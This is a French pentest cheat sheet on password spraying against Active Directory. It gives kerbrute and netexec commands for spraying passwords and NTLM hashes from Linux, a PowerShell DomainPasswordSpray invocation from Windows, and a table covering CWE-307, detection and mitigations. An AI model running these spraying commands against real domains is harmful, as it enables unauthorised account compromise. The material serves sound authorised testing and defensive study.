### Depuis Linux

#### Utilisation de kerbrute pour faire du password spraying sur une liste d'utilisateur et un password

```bash
kerbrute passwordspray -d $domain --dc $ip users.txt  $password
```

#### password spraying via netexec

```bash
netexec smb $ip -u users.txt -p $password | grep +
```

#### Hash spraying avec netexec

```bash
netexec smb $ip -u users.txt -H hash.txt | grep +
```

---

### Depuis Windows

[https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

```powershell
Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---

| Catégorie                    | Information                                                                                                                                                                                                                                                                |     |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- |
| **TTP**                      | Tentatives d'accès par essais de mots de passe communs sur de nombreux comptes                                                                                                                                                                                             |     |
| **CWE**                      | CWE-307 (Improper Restriction of Excessive Authentication Attempts)                                                                                                                                                                                                        |     |
| **Description de l'attaque** | Le Password Spraying consiste à tester un ou quelques mots de passe courants contre un grand nombre de comptes utilisateurs, réduisant ainsi le risque de détection par rapport aux attaques de force brute classiques.                                                    |     |
| **Impacts potentiels**       | - Accès non autorisé à de multiples comptes<br>- Compromission de la sécurité des informations<br>- Potentiel d'attaques plus larges sur le réseau                                                                                                                         |     |
| **Comment la détecter**      | - Surveillance des tentatives de connexion échouées sur de nombreux comptes<br>- Analyse des journaux pour identifier les modèles d'accès suspects<br>- Utilisation de solutions de détection d'intrusion                                                                  |     |
| **Remédiations/mitigations** | - Mise en œuvre de l'authentification multi-facteurs (MFA)<br>- Politiques de mots de passe forts et variés<br>- Verrouillage de compte après un nombre limité de tentatives échouées<br>- Formation et sensibilisation des utilisateurs sur la sécurité des mots de passe |     |
| **Lien de référence**        | [OWASP - Password Spraying Attack](https://owasp.org/www-community/attacks/Password_spraying_attack)                                                                                                                                                                       |     |

